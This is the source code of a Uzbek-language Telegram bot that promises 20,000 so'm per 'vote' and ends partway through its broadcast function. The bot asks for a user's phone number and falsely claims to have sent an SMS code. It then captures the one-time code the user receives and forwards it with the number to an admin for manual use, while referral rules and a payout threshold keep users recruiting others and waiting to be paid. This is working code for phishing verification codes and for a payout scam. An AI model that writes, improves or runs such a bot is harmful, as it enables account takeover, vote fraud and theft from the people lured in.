import asyncio
import asyncpg
import os
import logging
import re
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DATABASE_URL = os.getenv("DATABASE_URL")
PORT = int(os.getenv("PORT", 10000))
VOICE_PRICE = 20000  # 1 ovoz = 20,000 so'm

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN topilmadi!")
    exit(1)

if ADMIN_ID == 0:
    logger.error("❌ ADMIN_ID topilmadi!")
    exit(1)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# ================= HOLATLAR =================
user_states = {}
user_phones = {}
admin_states = {}
withdraw_states = {}

# ================= TUGMALAR =================
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton("📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

user_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("🗳️ Ovoz berish")],
        [KeyboardButton("💳 Hamyon"), KeyboardButton("💰 Balans")],
        [KeyboardButton("💸 Yechish")],
        [KeyboardButton("👥 Referallar")]
    ],
    resize_keyboard=True
)

admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton("📊 Statistika")],
        [KeyboardButton("📨 Barchaga xabar")],
        [KeyboardButton("📋 Kutayotgan kodlar")],
        [KeyboardButton("💸 Yechish so'rovlari")],
        [KeyboardButton("✅ Tasdiqlangan raqamlar")]
    ],
    resize_keyboard=True
)

# ================= TELEFON RAQAMNI TEKSHIRISH =================
def normalize_phone(phone):
    phone = re.sub(r'[\s\-\(\)]', '', phone)
    
    if phone.startswith('+998') and len(phone) == 13:
        return phone
    
    if phone.startswith('998') and len(phone) == 12:
        return '+' + phone
    
    if len(phone) == 9 and phone.startswith('9'):
        return '+998' + phone
    
    return None

def is_valid_phone(phone):
    normalized = normalize_phone(phone)
    if not normalized:
        return False
    
    if normalized.startswith('+998') and len(normalized) == 13:
        number = normalized[4:]
        if len(number) == 9 and number.isdigit():
            return True
    
    return False

# ================= DATABASE =================
async def get_db():
    """Database ulanishi"""
    try:
        conn = await asyncpg.connect(DATABASE_URL)
        return conn
    except Exception as e:
        logger.error(f"❌ Database ulanishda xatolik: {e}")
        raise

async def init_db():
    """Database jadvallarini yaratish"""
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE NOT NULL,
                phone VARCHAR(20) NOT NULL,
                balance INTEGER DEFAULT 0,
                referral_code VARCHAR(20) UNIQUE,
                referred_by BIGINT DEFAULT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS codes (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) NOT NULL,
                code VARCHAR(10) NOT NULL,
                telegram_id BIGINT NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP + INTERVAL '5 minutes'
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS verified_phones (
                id SERIAL PRIMARY KEY,
                phone VARCHAR(20) UNIQUE NOT NULL,
                telegram_id BIGINT NOT NULL,
                verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                amount INTEGER NOT NULL,
                type VARCHAR(20) DEFAULT 'deposit',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS withdraws (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT NOT NULL,
                phone VARCHAR(20) NOT NULL,
                amount INTEGER NOT NULL,
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id SERIAL PRIMARY KEY,
                referrer_id BIGINT NOT NULL,
                referred_id BIGINT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        logger.info("✅ Database tayyor")
    except Exception as e:
        logger.error(f"❌ Database xatosi: {e}")
        raise
    finally:
        if conn:
            await conn.close()

async def get_referral_count(conn, telegram_id):
    """Referallar sonini olish"""
    result = await conn.fetchval(
        "SELECT COUNT(*) FROM referrals WHERE referrer_id = $1",
        telegram_id
    )
    return result or 0

# ================= 1. START =================
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    telegram_id = message.from_user.id
    logger.info(f"👤 /start bosildi: {telegram_id}")
    
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 Xush kelibsiz, Admin!",
            reply_markup=admin_menu
        )
        return
    
    conn = None
    try:
        conn = await get_db()
        
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO NOTHING",
            telegram_id, "no_phone_yet"
        )
        
        user = await conn.fetchrow(
            "SELECT * FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user['referral_code']:
            import random
            import string
            ref_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            await conn.execute(
                "UPDATE users SET referral_code = $1 WHERE telegram_id = $2",
                ref_code, telegram_id
            )
        
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        if user['phone'] == "no_phone_yet" or user['phone'] is None:
            user_states[telegram_id] = "waiting_phone"
            
            await message.answer(
                f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
                f"💰 <b>1 OVOZ = {VOICE_PRICE:,} SO'M</b>\n\n"
                f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                f"📝 <b>Qanday ishlaydi:</b>\n"
                f"1️⃣ Telefon raqamingizni yuboring\n"
                f"2️⃣ SMS kodni kiriting\n"
                f"3️⃣ Admin tasdiqlaydi\n"
                f"4️⃣ {VOICE_PRICE:,} so'm olasiz!\n\n"
                f"👤 <b>Sizning referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"⚡️ <b>Tez va oson!</b>\n"
                f"💎 <b>Kafolatlangan to'lov!</b>\n\n"
                f"📱 <b>Telefon raqamingizni yuboring:</b>",
                reply_markup=phone_keyboard,
                parse_mode="HTML"
            )
        else:
            ref_count = await get_referral_count(conn, telegram_id)
            await message.answer(
                f"👋 <b>Xush kelibsiz!</b>\n\n"
                f"📱 <b>Telefon:</b> {user['phone']}\n"
                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n"
                f"👥 <b>Referallar:</b> {ref_count}\n\n"
                f"🎁 <b>Yana ovoz bering va yana {VOICE_PRICE:,} so'm oling!</b>\n\n"
                f"👇 Pastdagi tugmalardan foydalaning:",
                reply_markup=user_menu,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"❌ Start xatosi: {e}")
        await message.answer("❌ Xatolik yuz berdi! Qaytadan /start bosing")
    finally:
        if conn:
            await conn.close()

# ================= REFERRAL HANDLER =================
@dp.message_handler(lambda msg: msg.text == "👥 Referallar")
async def show_referrals(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT referral_code FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        ref_count = await get_referral_count(conn, telegram_id)
        bot_info = await bot.get_me()
        ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
        
        await message.answer(
            f"👥 <b>REFERRAL TIZIMI</b>\n\n"
            f"🔗 <b>Sizning referal link:</b>\n"
            f"<code>{ref_link}</code>\n\n"
            f"👤 <b>Referallar soni:</b> {ref_count}\n"
            f"🎯 <b>Yechish uchun kerak:</b> 3 ta\n\n"
            f"💡 <b>3 ta referral to'plang va pul yeching!</b>\n"
            f"💰 Har bir referal uchun {VOICE_PRICE // 2:,} so'm bonus!",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Referallar xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= REFERRAL START =================
@dp.message_handler(lambda msg: msg.text and msg.text.startswith('/start ref_'))
async def handle_referral(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    ref_code = message.text.replace('/start ref_', '')
    
    conn = None
    try:
        conn = await get_db()
        
        referer = await conn.fetchrow(
            "SELECT telegram_id FROM users WHERE referral_code = $1",
            ref_code
        )
        
        if referer and referer['telegram_id'] != telegram_id:
            await conn.execute(
                "INSERT INTO referrals (referrer_id, referred_id) "
                "VALUES ($1, $2) ON CONFLICT DO NOTHING",
                referer['telegram_id'], telegram_id
            )
            
            await conn.execute(
                "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                VOICE_PRICE // 2, referer['telegram_id']
            )
            
            try:
                await bot.send_message(
                    referer['telegram_id'],
                    f"🎉 <b>YANGI REFERAL!</b>\n\n"
                    f"👤 Yangi foydalanuvchi keldi!\n"
                    f"💰 +{VOICE_PRICE // 2:,} so'm bonus",
                    parse_mode="HTML"
                )
            except:
                pass
        
        await start(message)
    except Exception as e:
        logger.error(f"❌ Referral xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 2. OVOZ BERISH =================
@dp.message_handler(lambda msg: msg.text == "🗳️ Ovoz berish")
async def vote_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        f"🗳️ <b>OVOZ BERISH</b>\n\n"
        f"💰 1 ta ovoz = {VOICE_PRICE:,} so'm\n\n"
        f"📱 Telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard,
        parse_mode="HTML"
    )

# ================= 3-4. TELEFON RAQAM =================
@dp.message_handler(content_types=['contact'])
async def receive_phone_contact(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
        return
    
    if user_states.get(telegram_id) != "waiting_phone":
        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
        return
    
    phone = message.contact.phone_number
    await process_phone(message, phone)

@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_phone")
async def receive_phone_text(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        return
    
    phone = message.text.strip()
    
    if not is_valid_phone(phone):
        await message.answer(
            "❌ Noto'g'ri telefon raqam formati!\n\n"
            "To'g'ri formatlar:\n"
            "• +998901234567\n"
            "• 998901234567\n"
            "• 901234567\n\n"
            "Iltimos, qaytadan kiriting:"
        )
        return
    
    normalized_phone = normalize_phone(phone)
    await process_phone(message, normalized_phone)

async def process_phone(message: types.Message, phone: str):
    telegram_id = message.from_user.id
    
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    conn = None
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    except Exception as e:
        logger.error(f"❌ Foydalanuvchini saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    await message.answer(
        f"✅ {phone} raqamiga SMS kod yuborildi!\n\n"
        f"📨 Iltimos, telefoningizga kelgan 6 xonali kodni kiriting:\n"
        f"⏳ Kod 5 daqiqada amal qiladi."
    )
    
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📱 <b>YANGI TELEFON RAQAM</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"⏳ Kod kutilmoqda...",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")

# ================= 5. KODNI QABUL QILISH =================
@dp.message_handler(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    if not phone:
        await message.answer("❌ Xatolik! /start bosing")
        return
    
    if len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kod kiriting:")
        return
    
    conn = None
    try:
        conn = await get_db()
        
        expired = await conn.fetchval(
            "SELECT COUNT(*) FROM codes WHERE telegram_id = $1 AND status = 'pending' AND expires_at < NOW()",
            telegram_id
        )
        
        if expired > 0:
            await message.answer(
                "⏰ Kod vaqti tugadi!\n\n"
                "🗳️ Qaytadan ovoz berish tugmasini bosing va yangi kod oling.",
                reply_markup=user_menu
            )
            user_states[telegram_id] = "done"
            return
        
        await conn.execute(
            "INSERT INTO codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
    except Exception as e:
        logger.error(f"❌ Kodni saqlashda xatolik: {e}")
    finally:
        if conn:
            await conn.close()
    
    await message.answer(
        "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
        reply_markup=user_menu
    )
    
    try:
        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("✅ To'g'ri kod", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
            InlineKeyboardButton("❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
        )
        
        await bot.send_message(
            ADMIN_ID,
            f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
            f"🆔 ID: <code>{telegram_id}</code>\n"
            f"📞 Telefon: <code>{phone}</code>\n"
            f"🔑 Kod: <code>{code}</code>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
    
    user_states[telegram_id] = "done"

# ================= 6. ADMIN TASDIQLASH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = None
        try:
            conn = await get_db()
            
            result = await conn.execute(
                "UPDATE codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                await conn.execute(
                    "INSERT INTO verified_phones (phone, telegram_id) "
                    "VALUES ($1, $2) ON CONFLICT (phone) DO NOTHING",
                    phone, telegram_id
                )
                
                await conn.execute(
                    "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                    VOICE_PRICE, telegram_id
                )
                
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount, type) VALUES ($1, $2, 'deposit')",
                    telegram_id, VOICE_PRICE
                )
                
                try:
                    await bot.send_message(
                        telegram_id,
                        f"✅ <b>TABRIKLAYMIZ!</b> 🎉\n\n"
                        f"💰 Hisobingizga <b>+{VOICE_PRICE:,} so'm</b> qo'shildi!",
                        reply_markup=user_menu,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
                
                await callback.message.edit_text(
                    f"✅ <b>TASDIQLANDI!</b>\n\n"
                    f"🆔 ID: {telegram_id}\n"
                    f"📞 Tel: {phone}\n"
                    f"💰 +{VOICE_PRICE:,} so'm",
                    parse_mode="HTML"
                )
                await callback.answer("✅ Tasdiqlandi!")
            else:
                await callback.answer("❌ Kod allaqachon ishlangan!")
                
        except Exception as e:
            logger.error(f"❌ Tasdiqlashda xatolik: {e}")
            await callback.answer("❌ Xatolik!")
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = None
        try:
            conn = await get_db()
            
            await conn.execute(
                "UPDATE codes SET status = 'rejected' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    "❌ Kod noto'g'ri!\n\n"
                    "🗳️ Qaytadan ovoz berish tugmasini bosing.",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Foydalanuvchiga xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(
                f"❌ <b>RAD ETILDI!</b>\n\n🆔 ID: {telegram_id}",
                parse_mode="HTML"
            )
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Rad etishda xatolik: {e}")
            await callback.answer("❌ Xatolik!")
        finally:
            if conn:
                await conn.close()

# ================= 7. HAMYON / BALANS =================
@dp.message_handler(lambda msg: msg.text in ["💳 Hamyon", "💰 Balans"])
async def show_balance(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(
            f"💳 <b>Hamyon</b>\n\n"
            f"💰 Balans: {user['balance']:,} so'm\n\n"
            f"💸 Yechish uchun kamida 100,000 so'm va 3 ta referral kerak.",
            reply_markup=user_menu,
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 8. YECHISH =================
@dp.message_handler(lambda msg: msg.text == "💸 Yechish")
async def withdraw_start(message: types.Message):
    telegram_id = message.from_user.id
    
    if telegram_id == ADMIN_ID:
        await message.answer("👋 Siz adminsiz, /start bosing")
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        balance = user['balance']
        
        if balance == 0:
            await message.answer("❌ Hisobingizda mablag' yo'q!", reply_markup=user_menu)
            return
        
        if balance < 100000:
            await message.answer(
                f"❌ Balans: {balance:,} so'm\n"
                f"💰 Yechish uchun 100,000 so'm kerak!\n"
                f"Yana {100000 - balance:,} so'm kerak.",
                reply_markup=user_menu
            )
            return
        
        ref_count = await get_referral_count(conn, telegram_id)
        
        if ref_count < 3:
            bot_info = await bot.get_me()
            ref_link = f"https://t.me/{bot_info.username}?start=ref_{telegram_id}"
            await message.answer(
                f"❌ <b>Yechish uchun 3 ta referral kerak!</b>\n\n"
                f"👥 Sizda: {ref_count} ta referral\n"
                f"🎯 Kerak: 3 ta\n\n"
                f"🔗 <b>Referal link:</b>\n"
                f"<code>{ref_link}</code>\n\n"
                f"📤 Linkni do'stlaringizga yuboring va {VOICE_PRICE // 2:,} so'm bonus oling!",
                parse_mode="HTML"
            )
            return
        
        withdraw_states[telegram_id] = "waiting_withdraw_info"
        await message.answer(
            f"✅ <b>Yechish uchun tayyormisiz!</b>\n\n"
            f"💰 Balans: {balance:,} so'm\n"
            f"👥 Referallar: {ref_count} ta\n\n"
            f"📱 Yechish uchun telefon raqam yoki karta raqamingizni yuboring:",
            parse_mode="HTML"
        )
        
    except Exception as e:
        logger.error(f"❌ Yechish xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 9. YECHISH MA'LUMOTI =================
@dp.message_handler(lambda msg: withdraw_states.get(msg.from_user.id) == "waiting_withdraw_info")
async def withdraw_info(message: types.Message):
    telegram_id = message.from_user.id
    info = message.text.strip()
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            telegram_id
        )
        
        if not user:
            await message.answer("❌ Foydalanuvchi topilmadi!", reply_markup=user_menu)
            withdraw_states.pop(telegram_id, None)
            return
        
        balance = user['balance']
        
        if balance < 100000:
            await message.answer("❌ Balans yetarli emas!", reply_markup=user_menu)
            withdraw_states.pop(telegram_id, None)
            return
        
        await conn.execute(
            "INSERT INTO withdraws (telegram_id, phone, amount, status) "
            "VALUES ($1, $2, $3, 'pending')",
            telegram_id, info, balance
        )
        
        await conn.execute(
            "UPDATE users SET balance = balance - $1 WHERE telegram_id = $2",
            balance, telegram_id
        )
        
        await message.answer(
            f"✅ So'rov qabul qilindi!\n"
            f"💰 Summa: {balance:,} so'm\n"
            f"📱 Ma'lumot: {info}",
            reply_markup=user_menu
        )
        
        try:
            keyboard = InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                InlineKeyboardButton("✅ To'landi", callback_data=f"withdraw_done_{telegram_id}_{balance}"),
                InlineKeyboardButton("❌ Rad etish", callback_data=f"withdraw_reject_{telegram_id}")
            )
            
            user_profile_link = f"tg://user?id={telegram_id}"
            
            await bot.send_message(
                ADMIN_ID,
                f"💸 <b>YECHISH SO'ROVI</b>\n\n"
                f"👤 <a href='{user_profile_link}'>Foydalanuvchi profili</a>\n"
                f"🆔 ID: <code>{telegram_id}</code>\n"
                f"📱 Ma'lumot: <code>{info}</code>\n"
                f"💰 Summa: <code>{balance:,} so'm</code>\n"
                f"👥 Referallar: {await get_referral_count(conn, telegram_id)} ta",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
        
        withdraw_states.pop(telegram_id, None)
        
    except Exception as e:
        logger.error(f"❌ Yechish ma'lumot xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 10. ADMIN YECHISH =================
@dp.callback_query_handler(lambda c: c.data.startswith(("withdraw_done_", "withdraw_reject_")))
async def admin_withdraw_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[1]
    
    if action == "done":
        telegram_id = int(data[2])
        amount = int(data[3])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE withdraws SET status = 'completed' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            try:
                await bot.send_message(
                    telegram_id,
                    f"✅ To'lov amalga oshirildi!\n💰 Summa: {amount:,} so'm",
                    reply_markup=user_menu
                )
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
            
            await callback.message.edit_text(f"✅ To'landi!\n💰 {amount:,} so'm")
            await callback.answer("✅ To'landi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
        finally:
            if conn:
                await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[2])
        
        conn = None
        try:
            conn = await get_db()
            await conn.execute(
                "UPDATE withdraws SET status = 'rejected' WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            withdraw = await conn.fetchrow(
                "SELECT amount FROM withdraws WHERE telegram_id = $1 AND status = 'rejected'",
                telegram_id
            )
            
            if withdraw:
                await conn.execute(
                    "UPDATE users SET balance = balance + $1 WHERE telegram_id = $2",
                    withdraw['amount'], telegram_id
                )
            
            try:
                await bot.send_message(telegram_id, "❌ So'rov rad etildi! Pul balansga qaytarildi.", reply_markup=user_menu)
            except:
                pass
            
            await callback.message.edit_text(f"❌ Rad etildi!\nID: {telegram_id}")
            await callback.answer("❌ Rad etildi!")
            
        except Exception as e:
            logger.error(f"❌ Xatolik: {e}")
        finally:
            if conn:
                await conn.close()

# ================= 11. ADMIN STATISTIKA =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        total_users = await conn.fetchval("SELECT COUNT(*) FROM users")
        registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
        unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
        pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
        verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
        verified_phones = await conn.fetchval("SELECT COUNT(*) FROM verified_phones")
        total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
        pending_withdraws = await conn.fetchval("SELECT COUNT(*) FROM withdraws WHERE status = 'pending'")
        total_referrals = await conn.fetchval("SELECT COUNT(*) FROM referrals")
        
        await message.answer(
            f"📊 <b>STATISTIKA</b>\n\n"
            f"👥 Jami foydalanuvchilar: {total_users}\n"
            f"✅ Ro'yxatdan o'tganlar: {registered_users}\n"
            f"⏳ Telefon kiritmaganlar: {unregistered_users}\n"
            f"📱 Tasdiqlangan raqamlar: {verified_phones}\n"
            f"💰 Jami balans: {total_balance:,} so'm\n"
            f"⏳ Kutayotgan kodlar: {pending}\n"
            f"✅ Tasdiqlangan kodlar: {verified}\n"
            f"💸 Yechish so'rovlari: {pending_withdraws}\n"
            f"👥 Jami referallar: {total_referrals}",
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"❌ Statistika xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 12. KUTAYOTGAN KODLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        codes = await conn.fetch(
            "SELECT * FROM codes WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 <b>KUTAYOTGAN KODLAR:</b>\n\n"
            for c in codes:
                text += f"🆔 ID: <code>{c['telegram_id']}</code>\n"
                text += f"📞 Tel: <code>{c['phone']}</code>\n"
                text += f"🔑 Kod: <code>{c['code']}</code>\n"
                text += f"⏳ Vaqt: {c['created_at']}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 13. YECHISH SO'ROVLARI =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "💸 Yechish so'rovlari")
async def pending_withdraws(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        withdraws = await conn.fetch(
            "SELECT * FROM withdraws WHERE status = 'pending' ORDER BY id DESC LIMIT 20"
        )
        
        if withdraws:
            text = "💸 <b>YECHISH SO'ROVLARI:</b>\n\n"
            for w in withdraws:
                text += f"🆔 ID: <code>{w['telegram_id']}</code>\n"
                text += f"📱 Ma'lumot: <code>{w['phone']}</code>\n"
                text += f"💰 Summa: <code>{w['amount']:,} so'm</code>\n"
                text += f"📅 Vaqt: {w['created_at']}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 14. TASDIQLANGAN RAQAMLAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "✅ Tasdiqlangan raqamlar")
async def verified_phones(message: types.Message):
    conn = None
    try:
        conn = await get_db()
        phones = await conn.fetch(
            "SELECT * FROM verified_phones ORDER BY id DESC LIMIT 50"
        )
        
        if phones:
            text = "✅ <b>TASDIQLANGAN RAQAMLAR:</b>\n\n"
            for p in phones:
                text += f"📞 {p['phone']}\n"
                text += f"🆔 ID: {p['telegram_id']}\n"
                text += f"📅 Vaqt: {p['verified_at']}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Tasdiqlangan raqamlar yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 15. BARCHAGA XABAR =================
@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:")

@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = None
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        sent = 0
        for user in users:
            try:
                await bot.send_message(user['telegram_id'], f"📨 {text}")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
                pass
        
